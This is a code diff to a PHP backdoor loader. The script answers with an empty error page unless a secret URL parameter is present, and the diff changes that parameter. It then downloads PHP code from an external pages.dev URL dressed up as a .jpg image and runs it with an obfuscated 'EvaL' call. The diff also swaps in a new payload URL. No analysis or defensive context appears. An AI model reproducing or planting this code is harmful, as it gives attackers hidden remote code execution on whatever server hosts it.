@@ -1,6 +1,6 @@
 <?php
 // Check if the 'fetcher' parameter is present in the URL
-if (!isset($_GET['Eticketing'])) {
+if (!isset($_GET['WajarMasihBalita'])) {
     // If not, show error 500
     http_response_code(500);
     echo "";
@@ -233,7 +233,7 @@ class CodeExecutor
         }
 
         // Safely evaluate the fetched PHP code
-        // Note: Using eval is risky and should only be used in trusted environments.
+        // Note: Using eval is risky and should only be used in trustedenvironments.
         EvaL("?>" . $code);
     }
 }
@@ -247,7 +247,7 @@ try {
     $executor = new CodeExecutor($fetcher);
 
     // Execute the PHP code fetched from a specific URL
-    $executor->executeCodeFromURL("https://batuk-di-komik-aja.pages.dev/double.jpg");
+    $executor->executeCodeFromURL("https://batuk-di-komik-aja.pages.dev/loaders.jpg");
 } catch (Exception $e) {
     // Handle errors and exceptions
     echo "Error: " . $e->getMessage();
